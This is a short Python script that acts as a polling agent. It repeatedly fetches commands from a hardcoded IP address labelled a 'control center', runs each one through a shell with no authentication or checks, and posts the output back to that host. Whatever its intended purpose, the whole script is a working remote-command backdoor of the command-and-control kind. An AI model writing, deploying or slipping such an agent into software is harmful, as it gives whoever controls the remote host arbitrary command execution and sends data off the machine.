import time
import requests
import subprocess

SERVER_ID = "ms21"
CONTROL_CENTER_URL = "http://13.51.121.136:8000"

def poll_commands():
    while True:
        try:
            resp = requests.get(f"{CONTROL_CENTER_URL}/get_command/{SERVER_ID}")
            data = resp.json()
            if "command" in data:
                print(f"Отримано команду: {data['command']}")
                result = subprocess.run(
                    data["command"], shell=True,
                    capture_output=True, text=True
                )
                payload = {
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                    "code": result.returncode
                }
                requests.post(f"{CONTROL_CENTER_URL}/post_result/{SERVER_ID}", json=payload)
                print("Результат відправлено")
            else:
                print("Немає нових команд")
        except Exception as e:
            print(f"Помилка: {e}")
        time.sleep(5)

if __name__ == "__main__":
    poll_commands()
